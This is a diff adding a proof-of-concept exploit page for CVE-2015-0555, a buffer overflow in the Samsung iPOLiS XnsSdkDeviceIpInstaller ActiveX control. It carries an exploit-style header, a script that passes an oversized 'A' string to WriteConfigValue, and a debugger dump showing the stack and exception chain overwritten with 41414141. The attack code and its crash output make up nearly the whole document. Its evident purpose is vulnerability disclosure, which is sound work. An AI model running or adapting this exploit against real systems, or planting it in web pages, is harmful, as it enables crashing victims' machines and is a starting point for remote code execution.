@@ -1,0 +1,112 @@
+<!--
+# Exploit Title: (0day)Samsung iPOLiS XnsSdkDeviceIpInstaller ActiveX WriteConfigValue Remote Code Execution PoC (CVE-2015-0555)
+# Date: 22/02/2015
+# Exploit Author: Praveen Darshanam
+# Vendor Homepage: *https://www.samsung-security.com/Tools/device-manager.aspx
+# Version: Samsung iPOLiS 1.12.2
+# Tested on: Windows 7 Ultimate N SP1
+# CVE: 2015-0555
+-->
+
+<html>
+<!--
+Vulnerability found and PoC coded by Praveen Darshanam
+http://blog.disects.com
+CVE-2015-0555
+targetFile = "C:\Program Files\Samsung\iPOLiS Device Manager\XnsSdkDeviceIpInstaller.ocx"
+prototype  = "Function WriteConfigValue ( ByVal szKey As String ,  ByVal szValue As String ) As Long"
+memberName = "WriteConfigValue"
+progid     = "XNSSDKDEVICELib.XnsSdkDevice"
+Operating System = Windows 7 Ultimate N SP1
+Vulnerable Software = Samsung iPOLiS 1.12.2
+CERT tried to coordinate but there wasn't any response from Samsung
+-->
+<head> Samsung iPOLiS XnsSdkDeviceIpInstaller ActiveX WriteConfigValue Remote Code Execution PoC </head>
+<object classid='clsid:D3B78638-78BA-4587-88FE-0537A0825A72' id='target'> </object>
+<script>
+var arg1 = "";
+var arg2="praveend";
+
+for (i=0; i<= 15000; i++)
+{
+	arg1 += "A";
+}
+
+target.WriteConfigValue(arg1 ,arg2);
+
+</script>
+</html>
+
+<!--
+#############Stack Trace####################
+Exception Code: ACCESS_VIOLATION
+Disasm: 149434	MOV AL,[ESI+EDX]
+
+Seh Chain:
+--------------------------------------------------
+1 	647C7D7D 	mfc100.dll
+2 	647D0937 	mfc100.dll
+3 	64E242CA 	VBSCRIPT.dll
+4 	77B3E0ED 	ntdll.dll
+
+
+Called From                   Returns To
+--------------------------------------------------
+XNSSDKDEVICE.149434           41414141
+41414141                      414141
+414141                        3DA4C4
+3DA4C4                        mfc100.647790C1
+mfc100.647790C1               56746C75
+
+
+Registers:
+--------------------------------------------------
+EIP 00149434
+EAX 00003841
+EBX 00609FB0 -> 0015A564
+ECX 00003814
+EDX 00414141
+EDI 0000008F
+ESI 0000008F
+EBP 002BE5FC -> Asc: AAAAAAAAAAA
+ESP 002BE564 -> 0000000C
+
+
+Block Disassembly:
+--------------------------------------------------
+149423	XOR EDI,EDI
+149425	XOR ESI,ESI
+149427	MOV [EBP-8C],ECX
+14942D	TEST ECX,ECX
+14942F	JLE SHORT 00149496
+149431	MOV EDX,[EBP+8]
+149434	MOV AL,[ESI+EDX]	  <--- CRASH
+149437	CMP AL,2F
+149439	JNZ SHORT 00149489
+14943B	MOV ECX,EBX
+14943D	TEST ESI,ESI
+14943F	JNZ SHORT 0014944D
+149441	PUSH 159F28
+149446	CALL 0014F7C0
+14944B	JMP SHORT 00149476
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	00414141
+EBP+12	003DA4C4 -> Asc: defaultV
+EBP+16	647790C1 -> EBE84589
+EBP+20	FFFFFFFE
+EBP+24	646CBE5C -> CCCCCCC3
+EBP+28	0000001C
+
+
+Stack Dump:
+--------------------------------------------------
+2BE564 0C 00 00 00 00 E6 2B 00 B0 93 14 00 14 38 00 00  [................]
+2BE574 C4 A4 3D 00 41 41 41 41 41 41 41 41 41 41 41 41  [................]
+2BE584 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]
+2BE594 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]
+2BE5A4 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]
+
+-->
